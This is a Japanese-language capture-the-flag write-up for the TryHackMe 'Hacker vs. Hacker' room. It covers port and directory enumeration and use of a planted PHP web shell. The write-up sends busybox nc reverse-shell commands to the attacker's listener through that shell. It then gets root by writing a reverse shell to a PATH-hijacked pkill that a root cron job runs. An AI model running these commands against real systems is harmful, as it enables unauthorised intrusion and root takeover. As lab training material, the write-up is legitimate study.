# Hacker vs. Hacker CTF

https://tryhackme.com/room/hackervshacker

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.172.28
root@ip-10-10-240-41:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-12 01:15 BST
Nmap scan report for 10.10.172.28
Host is up (0.0045s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:D5:07:5F:64:5B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 4.34 seconds
root@ip-10-10-240-41:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-12 01:16 BST
Nmap scan report for 10.10.172.28
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:D5:07:5F:64:5B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.52 seconds
```

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.172.28/css/]
/cvs                  (Status: 301) [Size: 310] [--> http://10.10.172.28/cvs/]
/dist                 (Status: 301) [Size: 311] [--> http://10.10.172.28/dist/]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 313] [--> http://10.10.172.28/images/]
/server-status        (Status: 403) [Size: 277]
/upload.php           (Status: 200) [Size: 552]
```

Web画面でCVアップロードボタン（upload.php）でアップロードしようとすると、`Hacked! If you dont want me to upload my shell, do better at filtering! `と表示される。

/cvs ディレクトリにWebシェルが存在している可能性があると考えてgobusterとsearchdirを実行したが、見つからなかった。

先ほどのページのソースを見たらコメントアウトしたPHPコードが出ていた。

```php
Hacked! If you dont want me to upload my shell, do better at filtering!

<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}

-->
```

ファイル名に `.pdf` が必要だったことが分かったので、`pdf.php` で gobuster を実行しなおす。

```shell
root@ip-10-10-240-41:~# gobuster dir -x=pdf.php -u http://$TARGET/cvs -w ./dirlist.txt -t 30 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.172.28/cvs
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                ./dirlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              pdf.php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.pdf.php    (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.pdf.php    (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/shell.pdf.php        (Status: 200) [Size: 18]
Progress: 454380 / 454382 (100.00%)
===============================================================
Finished
===============================================================
```

ヒット！ `/shell.pdf.php` を発見した。

## /shell.pdf.php

http://10.10.172.28/cvs/shell.pdf.php?cmd=whoami  
を実行すると、下記が表示された。

```
www-data

boom!
```

いろいろ試したところ、busybox でリバースシェルをとれた。

```shell
busybox nc 10.2.22.182 6666 -e sh
```

http://10.10.172.28/cvs/shell.pdf.php?cmd=busybox%20nc%2010.2.22.182%206666%20-e%20sh

```shell
$ nc -nvlp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.172.28] 35268
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```shell
cat /home/lachlan/user.txt
thm{.........................}
```

ユーザーフラグゲット。

## 権限昇格

```shell
ls -al
total 36
drwxr-xr-x    4 lachlan  lachlan       4096 May  5  2022 .
drwxr-xr-x    3 root     root          4096 May  5  2022 ..
-rw-r--r--    1 lachlan  lachlan        168 May  5  2022 .bash_history
-rw-r--r--    1 lachlan  lachlan        220 Feb 25  2020 .bash_logout
-rw-r--r--    1 lachlan  lachlan       3771 Feb 25  2020 .bashrc
drwx------    2 lachlan  lachlan       4096 May  5  2022 .cache
-rw-r--r--    1 lachlan  lachlan        807 Feb 25  2020 .profile
drwxr-xr-x    2 lachlan  lachlan       4096 May  5  2022 bin
-rw-r--r--    1 lachlan  lachlan         38 May  5  2022 user.txt
```

```shell
ls -al bin
total 12
drwxr-xr-x    2 lachlan  lachlan       4096 May  5  2022 .
drwxr-xr-x    4 lachlan  lachlan       4096 May  5  2022 ..
-rw-r--r--    1 lachlan  lachlan         56 May  5  2022 backup.sh
```

```shell
cat bin/backup.sh
# todo: pita website backup as requested by her majest
```

/home/lachlan に .bash_history があった。

```shell
cat .bash_history
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nひみつ\nひみつ" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
```

- CVEを悪用して乗っ取り＆永続化したが、もうパッチを適用したから使えない
- lachlan のパスワードを変更した
- ln で bashヒストリー無効化しようとしたが、うっかり ls と間違えて失敗した
 
このパスワードを使って lachlan でSSH接続できるが、すぐに切断される。

```shell
cat /etc/cron.d/persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

このcronジョブにより、10秒間隔で pts が kill されている。

sshコマンドに -T オプションがある。これで pseudo terminal 割り当てを無効にできる。

```
-T      Disable pseudo-terminal allocation.
```

```shell
$ ssh lachlan@10.10.172.28 -T
```

cron 設定をみると、pkill が絶対パスになっていないので、/home/lachlan/bin にpkill を配置すれば、任意のコード実行が可能と思われる。

```
PATH=/home/lachlan/bin:/bin:/usr/bin

* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

リバースシェル配置

```shell
echo "busybox nc 10.2.22.182 6667 -e sh" > /home/lachlan/bin/pkill
chmod +x /home/lachlan/bin/pkill
```

ルートシェル取得成功

```shell
$ nc -nvlp 6667
listening on [any] 6667 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.172.28] 49688
id
uid=0(root) gid=0(root) groups=0(root)
```

```shell
cat /root/root.txt
thm{.......................}
```

ルートフラグゲット！


## 振り返り

- 個人的なことだが、現時点で公開されている Easy チャレンジ全クリア達成となる記念碑的なCTFになった。
- pts は勉強になった。
- とりあえず cron ジョブファイルを削除したら、SSHを切断される妨害は止まった。

```shell
# rm /etc/cron.d/persistence
```